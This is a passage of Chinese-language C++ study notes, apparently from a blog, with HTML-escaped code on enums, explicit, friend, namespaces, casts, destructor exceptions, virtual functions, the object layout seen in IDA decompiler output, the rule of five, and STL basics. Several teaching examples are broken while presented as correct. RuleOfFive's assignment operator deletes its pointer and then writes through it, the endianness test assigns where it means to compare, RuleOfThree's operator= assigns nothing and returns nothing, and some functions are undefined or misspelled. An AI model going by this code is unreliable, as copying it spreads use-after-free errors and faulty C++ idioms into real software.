&lt;&lt; &quot;green&quot; &lt;&lt; std::endl;\t\tbreak;\t\tcase blue:\t\t\tstd::cout &lt;&lt; &quot;blue&quot; &lt;&lt; std::endl;\t\tbreak;\t\tdefault:\t\t\tstd::cout &lt;&lt; &quot;what ?&quot; &lt;&lt; std::endl;\t&#125;&#125;enum class NewColor &#123;red, green, blue = green + 12&#125;;enum class MyColor : short &#123;black&#125;; //通过short指定元素的类型为short//若以bool作为函数参数, 建议使用enum来代替bool参数.enum class IsGood &#123;Yes, No&#125;;enum class IsOk &#123;Yes, No&#125;;void enumBoolTest(IsGood isGood, IsOk isOk) &#123;&#125;void testNewEnum() &#123;\tNewColor r = NewColor::blue;\tswitch(r) &#123;\t\tcase NewColor::blue: &#123;\t\t\tcout &lt;&lt; &quot;new blue&quot; &lt;&lt; endl;\t\t\t\t\t\t \t\t&#125; break;\t\tcase NewColor::red: &#123;\t\t\tcout &lt;&lt; &quot;new red&quot; &lt;&lt; endl;\t\t\t\t\t\t \t\t&#125; break;\t\tcase NewColor::green: &#123;\t\t\tcout &lt;&lt; &quot;new green&quot; &lt;&lt; endl; \t\t&#125; break;\t\tdefault:\t\t\tcout &lt;&lt; &quot;new what?&quot; &lt;&lt; endl;\t&#125;\tint i = static_cast&lt;int&gt;(blue) + static_cast&lt;int&gt;(NewColor::blue);\tcout &lt;&lt; &quot;blud + NewColor::blue = &quot; &lt;&lt; i &lt;&lt; endl;\tenumBoolTest(IsGood::Yes, IsOk::No);&#125;//---------------------------------------------------------------//test explicitstruct AA &#123;\tAA(int) &#123;&#125;\tAA(int, int) &#123;&#125;\toperator int() const &#123; return 0; &#125; //AA可以默认的转化为int类型&#125;;struct BB &#123;\texplicit BB(int) &#123;&#125;\tBB(int, int) &#123;&#125;\texplicit operator int() const &#123; return 0; &#125;&#125;;void testExplicit() &#123;\tAA a1 = 1; //等价于 AA a1 = AA(1);\t//而BB就不能 BB b = 1;\tAA a2 = &#123;3, 5&#125;; //等价于 AA a1 = AA(3, 5);\tBB b2 = &#123;3, 5&#125;; //BB中B(int, int)没有加explicit\tint i = a1; //能通过\t//而BB就不能 int i = b2;\t//将BB强转.\tint na2 = static_cast&lt;int&gt;(a1);\tint nb2 = static_cast&lt;int&gt;(b2); //强转explicit　可以\tAA a4 = (AA)3;\tBB b3 = (BB)4; //通过C语言方式强制转换, 可以&#125;//---------------------------------------------------------------//friendclass MyClass &#123;&#125;;class Friend &#123;\tprivate:\t\tint data; //private member\tfriend std::ostream &amp;operator &lt;&lt; (std::ostream &amp;out, const Friend &amp;o);\t//Mycla　类是Fried类的好友, 只是单向\ttemplate &lt;typename T&gt; friend class MyCla;  //every MyClass&lt;T&gt; is a friend of Friend\ttemplate &lt;typename T&gt; friend void f(T) &#123;&#125; //every f&lt;T&gt; if a friend of Firend\tpublic:\tFriend(int x) : data(x) &#123;&#125;\toperator int() const &#123; return this-&gt;data; &#125;&#125;;//这样可以拿这个函数当公共函数访问私有成员std::ostream &amp;operator &lt;&lt; (std::ostream &amp;out, const Friend &amp;f) &#123;\treturn out &lt;&lt; f.data;&#125;//若发生继承关系, MyCla不是, Friend2 的好友.class Friend2 : public Friend &#123; &#125;;void testFriend() &#123;\t\tFriend a = 44;\tcout &lt;&lt; a;&#125;//---------------------------------------------------------------//gotovoid testGoto() &#123;\tauto i = 0;NO:\tif(i &lt; 5) &#123;\t\tcout &lt;&lt; i;\t\ti ++;\t\tgoto NO;\t\t&#125;&#125;//---------------------------------------------------------------//inline//尽量的减少栈空间开辟和回收操作//类和模板函数,默认会加上inline进行优化.//但不一定快//inline 也可以与 namespace一起用， inline namespaceinline int plus(int a, int b) &#123;\treturn a + b;&#125;class Inline &#123;\t//在类中的函数里,编译器会默认加上inline进行优化\tpublic:\t\tvoid Member() const &#123; std::cout &lt;&lt; &quot;hello\\n&quot;; &#125;\t\tint vlaue() const &#123; return this-&gt;m_value; &#125;\tprivate:\t\tint m_value;&#125;;//---------------------------------------------------------------//namespacenamespace XGroup &#123;\tclass A_ &#123;\t\tint value;\t\t&#125;;&#125;namespace YGroup &#123;\tclass A_ &#123;\t\tint value;\t\t&#125;;\tclass B_ &#123;\t\tint value;\t\t&#125;;&#125;void testNmaespace() &#123;\tXGroup::A_ a;\t\tYGroup::A_ b;\t&#125;void testNamespace2() &#123;\tusing namespace XGroup;\tA_ a;\tusing namespace YGroup;\tB_ b; //可以不用写 YGroup::B_&#125;void testNamespace3() &#123;\tnamespace CGroup = XGroup;\t\tCGroup::A_ a;\tusing YGroup::B_;\tB_ b;&#125;//没有名字的namespacenamespace &#123;\tstd::string astring(&quot;long&quot;); //相当于　static std::string astirng&#125;void testNamespace4() &#123;\tcout &lt;&lt; astring; //打印astring&#125;//---------------------------------------------------------------//noexceptvoid noexCept() noexcept &#123; //声明确定不会抛出异常,可以减轻编译器压力,利于优化代码.\tstd::cout &lt;&lt; &quot;hello&quot; &lt;&lt; std::endl;\t//std::terminate(); abort(); exit(0);&#125;void noexCept2() noexcept(false) &#123; //等价于没写\tstd::cout &lt;&lt; &quot;hello&quot; &lt;&lt; std::endl;&#125;//---------------------------------------------------------------void nullPointer(int *a) &#123;&#125;template&lt;typename T, typename U&gt;void func(T t, U u) &#123;\tt(u);&#125;void testNullPointer() &#123;\t//三者直接调用,结果一样\tnullPointer(0);\tnullPointer(NULL); //(void*)0\tnullPointer(nullptr); //std::nullptr_t 在c++11中有专有的类型\t//利用模板函数之后, NULL 模板函数推导为int\tfunc(nullPointer, nullptr);\t//不能调用　//\tfunc(nullPointer, NULL);//\tfunc(nullPointer, 0);\t//若想调用,需要强制转换　\tfunc(nullPointer, (int*)0);\tfunc(nullPointer, (int*)NULL);&#125;//---------------------------------------------------------------//operatorstruct Operator &#123;\tpublic:\t\tOperator(int x) : data(x) &#123; &#125;//\toperator int() const &#123; return this-&gt;data; &#125;\tint operator &lt;&lt; (Operator const&amp; o) const &#123;\t\treturn data + o.data;\t&#125;\tint operator &amp; () const &#123; return data; &#125;\tprivate:\tint data;&#125;;void testOperator() &#123;\tOperator a = 10;\tOperator b = 5;\tOperator c = a &lt;&lt; b; //实际实现相加\tcout &lt;&lt; &amp;c &lt;&lt; endl; //采用去地址符号实现返回里面的值&#125;//实例应用:/*struct AClass &#123;\t~AClass() &#123; delete m_value&#125;\tAClass() : m_value(new int()) &#123;&#125;\tprivate:\tint *m_value;&#125;void test() &#123;\tAclass A;\tAclass B;\tA = B; //这种情况,里面的值m_value,会发生直接赋值,A和B直接指向同一块内存,\t//会发生两次析构,内存会错误.\t&#125; *///使用操作符重载 = 来避免:struct AClass &#123;\t~AClass() &#123; delete m_value;&#125;\tAClass(const AClass&amp; rhs) : m_value(new int(*(rhs.m_value))) &#123;&#125;\tAClass&amp; operator = (const AClass&amp; rhs) &#123;\t\t*m_value = *(rhs.m_value);\t\treturn *this;\t&#125;\tprivate:\t\tint *m_value;&#125;;//---------------------------------------------------------------//reinterpret_castvoid testReinterpret_cast() &#123;\t//reinterpret_cast\t//static_cast\t//const_cast\t//dynamic_cast\t//c like cast　可以实现以上的大部分, 而dynamic_cast c语言这种方式不能实现的\tint a = 1;\t// 也相当于 char* p = (char*)&amp;a;\tauto p = reinterpret_cast&lt;char *&gt;(&amp;a); //转化为char*\t//不能char* b = static_cast&lt;char*&gt; &amp;b;\tif(p[0] = 1) &#123;\t\tstd::cout &lt;&lt; &quot;the system is little endian\\n&quot;;\t&#125;else &#123;\t\tstd::cout &lt;&lt; &quot;the system is big endian\\n&quot;;\t&#125;&#125;//---------------------------------------------------------------//sizeof, before c++11struct SizeofEmpty &#123;&#125;;struct SizeofBase &#123; int a;&#125;;struct SizeofDerived : Base&#123; int b;&#125;;struct SizeofBit &#123;unsigned bit : 1;&#125;;void testSizeof() &#123;\tSizeofEmpty e;\tSizeofDerived d;\tSizeofBase b;\tSizeofBit bit;\tcout &lt;&lt; &quot;sizeof empty: &quot; &lt;&lt; sizeof e &lt;&lt; endl;\tcout &lt;&lt; &quot;sizeof derived: &quot; &lt;&lt; sizeof d &lt;&lt; endl;\tcout &lt;&lt; &quot;sizeof base: &quot; &lt;&lt; sizeof(b) &lt;&lt; endl;\tcout &lt;&lt; &quot;sizeof bit: &quot; &lt;&lt; sizeof(SizeofBit) &lt;&lt; endl;//\tcout &lt;&lt; &quot;szieof void&quot; &lt;&lt; sizeof(void) &lt;&lt; endl;//\tcout &lt;&lt; &quot;szieof int[]&quot; &lt;&lt; sizeof(int[]) &lt;&lt; endl;&#125;//---------------------------------------------------------------//static//最好要这么用static int globalA = 0;void printInfo() &#123;\tstatic int localStatic = 0; //多线程不要这么用\t++ localStatic;\tcout &lt;&lt; &quot;globalA: &quot; &lt;&lt; globalA &lt;&lt; &quot; &quot; &lt;&lt; &quot;localStatic: &quot; &lt;&lt; localStatic &lt;&lt; endl;&#125;struct Static &#123;\tstatic int s; //注意: sizeof(Static) == 1, s的空间已经分配&#125;;int Static::s = 10;struct HeHe &#123;&#125;;struct Static2 &#123;\tstatic int a[];\tstatic HeHe foo;\tstatic Static2 ss;&#125;;//对成员进行实例化int Static2::a[10];HeHe Static2::foo;Static2 Static2::ss;//---------------------------------------------------------------//static_assert c++11的一个宏, 在编译期进行检测//assert 是在运行的时候进行检测void testStaticAssert() &#123;\tstatic_assert(sizeof(int) == 4, &quot;only work for int of 32bit&quot;);\tstatic_assert(sizeof(long) == sizeof(long long),\t\t\t&quot;only work for int of 32bit&quot;);\tint a = 5; //判断变量 a == b 采用assert\tint b = 5;\tassert(a != b &amp;&amp; &quot;error&quot;); &#125;template&lt;typename T&gt;void static_assertFun() &#123;\tstatic_assert(alignof(T) ==4, &quot;only for alignof 4&quot;);&#125;//---------------------------------------------------------------//typedef , 换名称typedef unsigned long ulong;class Comp &#123;\ttypedef std::map&lt;int, ulong&gt; Group;\tGroup a; //相当于 std::map&lt;int, ulong&gt; a;\tvoid aa() &#123;\t\t//std::map&lt;int, ulong&gt;::iterator iter = a.find(10)\t\tGroup::iterator iter = a.find(10);\t\t//也可以使用: auto iter = a.fine(10);\t&#125;&#125;;//---------------------------------------------------------------//using //可以使用与namespace,也可以替换typedefusing newGroup = std::map&lt;int, ulong&gt;;//using namespace std;//---------------------------------------------------------------int main(void) &#123;//\tshowAuto();//\tshowBitAndOr();//\tshowAsm();//\ttestAnd_eq();//\ttestNot();//\ttestNot_eq();//\ttestBool();//\ttestBreak();//\ttestCompl();//\ttestConstExpr();//\ttestConst_cast();//\ttestDecltype();//\ttestDynamic_cast();//\ttestOldEnum();//\ttestNewEnum();//\ttestExplicit();//\ttestFriend();//\ttestGoto();//\ttestNamespace4();//\ttestOperator();//\ttestReinterpret_cast();//\ttestSizeof();\ttestStaticAssert();\treturn 0;&#125;\n\nClassC++析构函数中抛出异常问题注意: 不要在析构函数中抛出异常 \n析构函数调用规则\n先调用成员析构\n再调用派生类析构\n\n问题代码分析代码如下\n#include &lt;iostream&gt;class A &#123;\tpublic:\t\tA() &#123;&#125;\t\t~A() &#123; std::cout &lt;&lt; &quot;A析构了..&quot; &lt;&lt; std::endl; &#125;&#125;;//析构函数绝对不要抛出异常class B : public A&#123;\tpublic:\t\tB() &#123;&#125;\t\t~B() &#123; std::cout &lt;&lt; &quot;B析构了.. &quot; &lt;&lt; std::endl; \t\tthrow std::string(&quot;B error&quot;); &#125; // 编译器默认析构函数: inline ~B() noexcept &#123;&#125;\t//编译器默认析构函数实现:\t/*\t\tinline ~B() noexcept &#123;\t\t\ttry &#123;\t\t\t\t\t\t&#125; catch(...) &#123;\t\t\t\tstd::terminate();\t\t\t\t\t//析构函数绝对不要抛出异常\t\t\t&#125;\t\t&#125; \t */\tprivate:\t\tstd::string m_value;\t\t/*\t\t\t在掉~B() 析构时候, 先调用 m_value的析构,再调用派生类 ~A();\t\t */&#125;;void testClass_1() &#123; //测试析构\tB *b = new B;\tdelete b;&#125;class EvilB : public B &#123;\tpublic:\t\t~EvilB() noexcept(false) &#123; throw std::string(&quot;error&quot;); &#125;&#125;;void testEvilB() &#123;\ttry &#123;\t\tEvilB *b = new EvilB();\t\t\tdelete b;\t\t\t&#125; catch(std::string e) &#123;\t\t//没有捕获到异常,编译器已经调用std::terminate(),且程序崩溃\t\t//因为编译器为析构函数默认加入关键字 noexcept,可以加入关键字 noexcept(false) \t\t//问题1 : 派生类虽然能够析构,若派生类析构函数也抛出异常,则程序就挂.\t\t//出现抛出两个异常, 则无法捕获.\t\t//问题2 : 若声明两次EvilB对象,析构两次时,则程序就会崩溃.\t\tstd::cout &lt;&lt; &quot;catch your evil: &quot; &lt;&lt; e &lt;&lt;  std::endl;\t&#125;&#125;int main(void) &#123;\ttestEvilB();\treturn 0;&#125;\n\n正确做法建议: 在类的构造函数中抛出异常 \n代码如下\n#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;vector&gt;#include &lt;cassert&gt;class A &#123;\tpublic:\t\tA() &#123;&#125;&#125;;class B : public A &#123;\tpublic:\t\tB() &#123;&#125;\t\t~B() &#123; /*std::cout &lt;&lt; &quot;byebye B\\n&quot;;*/ &#125;\tprivate:\t\tstd::string m_value;&#125;;class GoodB : public B &#123;\tpublic:\t\tGoodB() : m_v(new char(10000000)) &#123;&#125;\t\tGoodB(const char* f) : m_file(f, std::ios_base::in) &#123;\t\t\t//在构造器里进行抛出异常,而不是一直判断是否有错误来避免错误.\t\t\tif(!m_file.is_open()) throw std::string(&quot;Couldn&#x27;t open file..\\n&quot;);\t\t\tstd::string line;\t\t\t\twhile(std::getline(m_file, line)) &#123;\t\t\t\tm_info.push_back(line);\t\t\t&#125;\t\t&#125;\t\tvoid doIt( GoodB const&amp;b) &#123;\t\t\tif(b.isOpen()) &#123;\t\t\t\t//do\t\t\t\t&#125;\t\t&#125;\t\t//通过析构来提示.\t\t~GoodB() &#123; assert((!isOpen()) &amp;&amp; &quot;open file: &quot;); &#125;\tprivate:\t\tchar *m_v;\t\tstd::fstream m_file; //外部文件 \t\tstd::vector&lt;std::string&gt; m_info;\t\t//若作为状态判断,一般声明为私有函数, 通过assert来提示.\t\tbool isOpen() const &#123; return !m_info.empty(); &#125;&#125;;//循环构造, 内存崩溃//想实现一个 std::out_of_memory 异常void test() &#123;\tint i = 0;\tfor(;;) &#123;\t\ttry &#123;\t\t\t++i;\t\t\t\tif(i % 10000 == 0) std::cout &lt;&lt; &quot;count i: &quot; &lt;&lt; i &lt;&lt; std::endl;\t\t\tGoodB b;\t\t\t&#125; catch(...) &#123;\t\t\treturn ;\t\t\t&#125;\t&#125;&#125;void test2(char *filename) &#123;\ttry &#123;//在构造时候进行抛出异常,重复抛出, 不会出现问题, 而在析构函数中抛出,程序则会崩溃\t\tGoodB b(filename);\t\tGoodB d(filename);\t\tb.doIt(b);\t\t//std::swap(b, d) //也不要抛出异常\t&#125; catch(std::string msg) &#123;\t\tstd::cout &lt;&lt; msg;\t&#125;&#125;int main(int argc, char** argv) &#123;\tif(argc &lt;= 1) return 1;//\ttest();\ttest2(argv[1]);\tstd::cout &lt;&lt; &quot;exit!!!\\n&quot;;\treturn 0;&#125;\n\n\n\n\n\n管理内存的几种方式#include &lt;iostream&gt;#include &lt;memory&gt;static void versionOne();static void versionTwo();using namespace std;int main(void) &#123;\tversionOne();\tversionTwo();\tversionThree();\treturn EXIT_SUCCESS;&#125;void versionOne() &#123;\t//c语言方式开辟内存\tint *ageC = (int*) malloc(sizeof(int));\tif(argC) &#123;\t\tfree(ageC);\t&#125;\tchar *c = (char*) malloc(100);\tfree(c);\t//c++ 开辟内存方式\tint *age = new int(25);\tint *height = new int(160);\t//缺陷,容易忘掉free 或 delete&#125;void versionTow() &#123;\t//智能指针\tstd::shared_ptr&lt;int&gt; age(new int(28));\tstd::shared_ptr&lt;int&gt; height(new int(160));\tstd::cout &lt;&lt; &quot;VersionTwo: you age is &quot; &lt;&lt; *age &lt;&lt; &quot;, and your height is &quot;\t\t&lt;&lt; *height &lt;&lt; std::endl;\t//不需要做任何事情, 内存会自动的释放掉\t//基本上,不会造成内存泄露问题&#125;\n\n\n\n\n\n逐渐退化的虚函数#include &lt;map&gt;#include &lt;iostream&gt;/*\t类虚函数遇到构造和析构就退化了 */class Event; //类的前置声明class Event &#123;&#125;;class Base &#123;\tpublic:\t\tvirtual ~Base() &#123;&#125; //why? virtual\t\tBase(int _id) : m_id(_id) &#123;&#125;\t\tvirtual void act(Event const&amp;) = 0;\t\tvirtual void print() const = 0;\t\tint id() const &#123; return m_id; &#125; \tprivate:\t\tint m_id;&#125;;class Drived : public Base &#123; //why public?\tpublic:\t\tvoid act (Event const&amp;);\t\tvoid print() const;\t\tDrived(int id);\t\t~Drived();\tprivate:&#125;;class Grouped : public Base &#123;\tpublic:\t\tvoid act(Event const&amp;);\t\tvoid print() const;\t\tvoid addBase(Base* b);\t\tvoid removeBase(int id);\t\tGrouped(int id);\t\t~Grouped();\tprivate:\t\tstd::map&lt;int, Base *&gt; m_info;&#125;;void test() &#123;\t//int a = 1;\t/*\tDrived *info = new Drived(1);\t\tGrouped *group = new Grouped();\tgroup-&gt;print();\tgroup-&gt;act(ev);\tgroup-&gt;addBase(info);\tgroup-&gt;removeBase(info-&gt;id());\tgroup-&gt;id();\tBase *baseGroup = group;\tbaseGroup-&gt;act(ev);\tbaseGroup-&gt;print();\tbaseGroup-&gt;id();\t//removeBase()\t//addBase()\t//而基类的指针baseGroup中强制把派生类转换,而基类在虚函数中干的事,与派生类的一样\t//相当于派生类来实现函数,而不是基类.这就实现了指针对接口进行编程.\tdelete group; //delete baseGroup;没有内存泄露,　与delete group等价\tdelete info;\t*/&#125;int main(void) &#123;\ttest();\treturn 0 ;&#125;\n\n\n\n\n\n虚函数几种实现方法#include &lt;fstream&gt;#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;vector&gt;struct Base &#123;\tvirtual void f() &#123; std::cout &lt;&lt; &quot;base&quot; &lt;&lt; std::endl; &#125;\tvirtual void init() &#123;&#125;\tBase() &#123;\t\tinit();\t\t&#125;&#125;;struct Derived : Base &#123; //结构体默认为public 继承, 类默认为 private\tvoid f() override &#123; //加入override关键字,表示重写基类的f()虚函数\t\tstd::cout &lt;&lt; &quot;derived overide&quot; &lt;&lt; std::endl;\t&#125;\tvoid init() override &#123; std::cout &lt;&lt; &quot;virtual init&quot; &lt;&lt; std::endl; &#125;&#125; ;struct Derived2 : Derived &#123;\tpublic:\t\tvoid f() &#123;&#125;\t\tvoid init() &#123;&#125;&#125;;Base* factoryBase(int type) &#123;\tBase* ret = nullptr;\tif(type == 0) &#123;\t\tret = new Base();\t\t&#125;else if(type == 1) &#123;\t\tret = new Derived();\t\t&#125;else if(type == 2) &#123;\t\tret = new Derived2();\t\t&#125;\tif(ret) ret-&gt;init();\treturn ret;&#125;void testVirtual() &#123;\t//Base b;\t//Derived d;\t////虚函数调用通过引用\t////virtual funciton call through reference\t//Base&amp; br = b;  //the type of br is Base&amp;\t//Base&amp; dr = d;  //the type of dr is Base&amp; as well\t//br.f();\t//dr.f(); //在Derived类中已经对fun() 重写.\t//\t////虚函数调用通过指针\t////virtual function call through pointer\t//Base* bp = &amp;b;\t//Base* dp = &amp;d;\t//bp-&gt;f();\t//dp-&gt;f();\t////直接调用.\t////non-virtual function call\t//b.Base::f();\t//d.Derived::f(); //派生类\t//d.Base::f(); //基类\t////若在构造函数中或者析构函数中调用虚函数, 则会调用自身类中的虚函数,而不是派生类的重写的虚函数\t////虚函数特性还没体现\tDerived d;&#125;int main(void) &#123;\ttestVirtual();\treturn 0;&#125;\n\n对象内存布局普通对象#include &lt;iostream&gt;class A &#123;public:\tA() &#123;\t\tstd::cout &lt;&lt; &quot;A\\n&quot;;\t&#125;\t~A() &#123;\t\tstd::cout &lt;&lt; &quot;~A\\n&quot;;\t&#125;private:\tint a = 1;\tint b = 2;&#125;;int main() &#123;\tA a;\treturn 0;&#125;\n\n生成可执行文件ida反编译如下:\nmain\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char v4[8]; // [rsp+0h] [rbp-20h] BYREF  unsigned __int64 v5; // [rsp+8h] [rbp-18h]  v5 = __readfsqword(0x28u);  A::A((A *)v4);  A::~A((A *)v4);  return 0;&#125;\n\nA::A()\nvoid __fastcall A::A(A *this)&#123;  *(_DWORD *)this = 1;  *((_DWORD *)this + 1) = 2;  std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &amp;unk_2005);&#125;\n\nA::~A()\nvoid __fastcall A::~A(A *this)&#123;  std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &amp;unk_2008);&#125;\n\nthis指针即是堆栈上数据v4的地址。\n在堆区上的普通对象source\n#include &lt;iostream&gt;class A &#123;public:\tA() &#123; std::cout &lt;&lt; &quot;A\\n&quot;;&#125;\t~A() &#123; std::cout &lt;&lt; &quot;~A\\n&quot;;&#125;\tvoid test() &#123; std::cout &lt;&lt; &quot;test\\n&quot;;&#125;private:\tint a = 1;\tint b = 2;&#125;;int main() &#123;\tA *a = new A();\ta-&gt;test();\treturn 0;&#125;\n\n生成可执行文件ida反编译如下:\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  A *v3; // rbx  v3 = (A *)operator new(8uLL);  A::A(v3);  A::test(v3);  return 0;&#125;\n\nA::A()\nvoid __fastcall A::A(A *this)&#123;  *(_DWORD *)this = 1;  *((_DWORD *)this + 1) = 2;  std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &amp;unk_2005);&#125;\n\n与堆栈上的差不多， 堆栈上的对象不用管内存泄漏问题，编译器调用析构函数，开辟在堆区的对象由于没有delete a，所有没有析构函数调用和内存的释放，出现内存泄漏。\n拥有vital function#include &lt;iostream&gt;class A &#123;public:\tA() &#123;\t\tstd::cout &lt;&lt; &quot;A\\n&quot;;\t&#125;\t~A() &#123;\t\tstd::cout &lt;&lt; &quot;~A\\n&quot;;\t&#125;\tvirtual void vir_1() &#123;\t\tstd::cout &lt;&lt; &quot;vir_1 A\\n&quot;;\t&#125;\tvirtual void vir_2() = 0;private:\tint a;\tint b;&#125;;class B : public A&#123;public:\tB() &#123;std::cout &lt;&lt; &quot;B\\n&quot;;&#125;\t\t~B() &#123;std::cout &lt;&lt; &quot;~B\\n&quot;;&#125;\t\tvirtual void vir_2() &#123;\t&#125;private:\tint a = 4;&#125;;int main() &#123;\tB a;\treturn 0;&#125;\n\n 生成可执行文件ida反编译如下:\nmain\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char v4[24]; // [rsp+0h] [rbp-30h] BYREF  unsigned __int64 v5; // [rsp+18h] [rbp-18h]  v5 = __readfsqword(0x28u);  B::B((B *)v4);  B::~B((B *)v4);  return 0;&#125;\n\nB::B()\nvoid __fastcall B::B(B *this)&#123;  A::A(this); //先构造父类  *(_QWORD *)this = off_3D68; // 3D68这个位置就是B类的虚函数表,将B类的虚函数表赋给this指针指向的第一个内存块    /*    .data.rel.ro:0000000000003D68 off_3D68        dq offset _ZN1A5vir_1Ev ; DATA XREF: B::B(void)+19↑o\t.data.rel.ro:0000000000003D68                                         ; B::~B()+C↑o\t.data.rel.ro:0000000000003D68                                         ; A::vir_1(void)\t.data.rel.ro:0000000000003D70                 dq offset _ZN1B5vir_2Ev ; B::vir_2(void)    */  *((_DWORD *)this + 4) = 4;  std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;B\\n&quot;);&#125;\n\nA::A()\nvoid __fastcall A::A(A *this)&#123;  *(_QWORD *)this = &amp;off_3D88; // 3D88是A类的虚函数表    /*    .data.rel.ro:0000000000003D88 off_3D88        dq offset _ZN1A5vir_1Ev ; DATA XREF: A::A(void)+C↑o\t.data.rel.ro:0000000000003D88                                         ; A::~A()+C↑o\t.data.rel.ro:0000000000003D88                                         ; A::vir_1(void)    */  std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &amp;unk_2005);&#125;\n\nB::~B() \nvoid __fastcall B::~B(B *this)&#123;  *(_QWORD *)this = off_3D68; //析构时再次赋予虚函数表  std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;~B\\n&quot;);  A::~A(this);&#125;\n\nA::~A()\nvoid __fastcall A::~A(A *this)&#123;  *(_QWORD *)this = &amp;off_3D88; //析构时再次赋予虚函数表  std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &amp;unk_2008);&#125;\n\n由以上看类中的内容是储存在ptr + 1之后的，第一个用于储存虚函数表的地址。\nref: https://www.cnblogs.com/qg-whz/p/4909359.html\n基本原则C++98 类的基本三大原则\n类的构造\n类的析构\n类的复制\n\n若c++98中,不想复制的话,把构造函数设为私有变量, 并不实现构造函数不然编译器会自动生成一个对应的构造函数\nC++11 类的基本五大原则前面三点基于c++98，增加了两个原则\n\n5 可以对拷贝构造函数和operator&#x3D;进行右值引用进行重载\n\n也就是采用左值或者右值进行构造,编译器会对不同的构造函数进行构造.\n代码例子\n#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;vector&gt;#include &lt;cstring&gt;#include &lt;cassert&gt;class RuleOfFive;  //前置声明classclass Parent;class Child &#123;\tpublic:\t\texplicit Child(Parent *p) : m_parent(p) &#123;&#125;\tprivate:\t\tParent *m_parent;&#125;;class Parent &#123;\tpublic:\t\t//                           等同于: m_children.push_back(child)\t\tbool addChild(Child* child) &#123;m_children.emplace_back(child); &#125;\tprivate:\t\tstd::vector&lt;Child*&gt; m_children;&#125;;//若c++98中,不想复制的话,把构造函数设为私有变量, 并不实现构造函数//不然编译器会自动生成一个对应的构造函数//c++11 中: RuleOfThree(const RuleOfThree&amp; other) = delete;class RuleOfThree &#123;\tpublic:\t\tRuleOfThree(const char* arg) : cstring(new char[std::strlen(arg) + 1])&#123; //allocate\t\t\tstd::strcpy(cstring, arg); //populate\t\t\t&#125;\t\t~RuleOfThree() &#123;\t\t\tdelete[] cstring;\t\t\t&#125;\t\t//c++ 11中,声明该构造不能用, 以防编译器自动生成一个构造函数\t\tRuleOfThree(const RuleOfThree&amp; other)  = delete;\t\t//\t&#123;//copy constructor\t\t//\t\tcstring = new char[std::strlen(other.cstring) + 1];\t\t//\t\tstd::strcpy(cstring, other.cstring);\t\t//\t&#125;\t\tRuleOfThree&amp; operator = (const RuleOfThree&amp; other) &#123;\t\t\tchar *tmp_cstring = new char[std::strlen(other.cstring) + 1];\t\t\t\tstd::strcpy(tmp_cstring, other.cstring);\t\t\tdelete[] cstring;\t\t&#125;\tprivate:\t\tchar* cstring;&#125;;//c++11//类的５大基本原则://采用左值或者右值进行构造,编译器会对不同的构造函数进行构造.class RuleOfFive &#123;\tpublic:\t\t//只能针对与右值进行构造\t\tRuleOfFive(RuleOfFive&amp;&amp; rhs) &#123;\t\t\tstd::cout &lt;&lt; &quot;右值构造..&quot; &lt;&lt; std::endl;\t\t\tstd::cout &lt;&lt; rhs.m_value;\t\t\tm_value = rhs.m_value;\t\t\trhs.m_value = nullptr;\t\t&#125;;\t\tRuleOfFive() : m_value(new int(10) ) &#123;&#125;\t\t//采用右值或者左值进行构造\t\tRuleOfFive(const RuleOfFive &amp;rhs) : m_value(new int(* (rhs.m_value))) &#123;\t\t\tstd::cout &lt;&lt; &quot;左值或者右值构造..&quot; &lt;&lt; std::endl;\t\t&#125;\t\tRuleOfFive&amp; operator = (const RuleOfFive &amp;rhs) &#123;\t\t\tdelete m_value; //删掉以前的\t\t\t*m_value = *(rhs.m_value);\t\t\treturn *this;\t\t&#125;\t\t//对= 操作符进行右值重载\t\tRuleOfFive&amp; operator=(RuleOfFive&amp;&amp; rhs) &#123;\t\t\tm_value = rhs.m_value;\t\t\t\trhs.m_value = nullptr;\t\t\treturn *this;\t\t&#125;\t\tvoid print() const &#123;\t\t\tassert(m_value &amp;&amp; &quot;class print: &quot;); //不推荐使用if来判断\t\t\tstd::cout &lt;&lt; &quot;value: &quot; &lt;&lt; *m_value &lt;&lt; std::endl;\t\t&#125;\t\t~RuleOfFive() &#123; delete m_value; &#125;\tprivate:\t\tint *m_value;&#125;;//左值和右值的定义://1. 能够取到地址的值称为左值,否则为右值void leftOrRight() &#123;\tint a = 0;\tint b;\tint c = 2 + 3;\tint d = a + c;\tauto address = &amp;a;\t//auto address2 = &amp;(2 + 3);\tint&amp; e = a; //左值引用\t//int&amp; e2 = 3; //错误\tint&amp;&amp; e3 = 3; //右值引用.&#125;//c++11增加了左值和右值的概念, 所以类的从３大基本原则变为了5大基本原则void leftAndRight() &#123;\tstd::vector&lt;int&gt; a; //left\tfor(int i = 0; i &lt; 10; ++i) a.push_back(i);\tauto b = a; //b as left value\tauto &amp;c = b; //c as left value\t//std::vector&lt;int&gt;&amp; c = b; //c as left value\t//move函数啥也不干,就是让编译器把b转换为右值.\tauto d = std::move(b);//std::move(b) 就为右值了\tRuleOfFive f;\tRuleOfFive g(f); //左值构造\tRuleOfFive h (std::move(f)); //右值构造, f已经毫无意义//\tf.print(); //m_value 已经为nullptr&#125;int main(void) &#123;\tleftAndRight();\treturn 0;&#125;\n\n\n\n\n\nSTLSTL 是一个框架, 将数据结构和算法进一步的抽象, 包含了容器, 迭代器, 算法容器: 储存数据的\n迭代器: 容器之间统一的一个查询元素接口，可以用来遍历容器的元素\n算法:  查找, 排序, 修改…\n类别1 序列式容器 array &#x2F; vector &#x2F; deque&#x2F;list &#x2F; forward_list\t\t 一般实现方式: 数组 ,指针 链表2 关联类有序容器 set &#x2F; map &#x2F; multiset &#x2F; multimap               实现方式: 二叉树, 红黑树3 关联类无序容器 unordered_map &#x2F; unordered_set &#x2F; unordered_multimap &#x2F; unordered_multiset\t\t实现方式: hash table, 